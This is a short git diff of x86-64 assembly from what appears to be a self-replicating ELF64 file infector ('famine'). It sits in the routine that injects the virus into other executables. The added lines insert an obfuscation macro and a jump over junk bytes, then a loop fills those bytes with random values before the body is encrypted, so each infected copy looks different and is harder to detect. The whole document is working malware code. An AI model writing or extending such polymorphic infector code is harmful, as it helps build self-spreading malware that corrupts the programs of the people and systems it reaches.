@@ -450,8 +450,12 @@ check_elf64:
 inject_self:
 	push r13		; save registers in case we need to restore 
 	OBF_OVERWRITE_PUSHR14R15
+	
+	OBF_GENERIC2
+	jmp .after_poly_crap_skipped
+	POLY_CRAP_SKIPPED
 
-
+	.after_poly_crap_skipped:
 	mov r15, rdi ; save phdr[0] offset to r15
 	mov rdx, qword [rdi + elf64_ehdr.e_entry]
 	movzx rcx, word [rdi + elf64_ehdr.e_phnum]
@@ -594,10 +598,23 @@ OBF_GENERIC1
 	mov r12, STACK(famine.tmp_rand)
 	mov dword[r10], r12d
 
-	CYPHER
-	pop r12
 
-	
+	call _start.get_random
+	lea r10, STACK(famine.tocypher)
+	add r10, POLY_CRAP_SKIPPED_OFFSET
+	mov rsi, 7
+
+	.patch_poly_crap:
+	call _start.get_random
+	mov r12, STACK(famine.tmp_rand)
+	mov dword[r10], r12d
+	add r10, 4
+	dec rsi
+	cmp rsi, 0
+	jne .patch_poly_crap
+
+CYPHER
+	pop r12
 
 	mov rdi, STACK(famine.file_fd) ; fd to rdi
 	lea rsi, STACK(famine.tocypher)
